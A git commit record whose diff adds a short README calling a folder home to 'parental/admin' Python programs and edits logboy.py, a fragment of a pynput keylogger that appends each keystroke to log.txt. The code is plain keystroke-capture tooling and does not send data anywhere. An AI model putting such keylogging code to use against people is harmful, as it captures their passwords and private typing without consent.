4a531fa1daa38459bcfb74a3986c81e5b5987afe
Joel_Paiva <joelpaiva112233@gmail.com>
2023-01-03 10:21:27 +0200

    added a key logger to parental and nmapy

---
+++ parental/README.md
@@ -0,0 +1,1 @@
+This is a file that will contain python programs that can be used for parental/admin purposes
--- parental/logboy.py
+++ parental/logboy.py
@@ -1,10 +1,10 @@
 #!/bin/python3
 
-from pynput.keyboard import listener
+from pynput.keyboard import Listener
 
 def typytypy(key):
     with open("log.txt", "a") as f:
-        f.write(str(key))
+        f.write(str(key) + "\n")
 
 
 
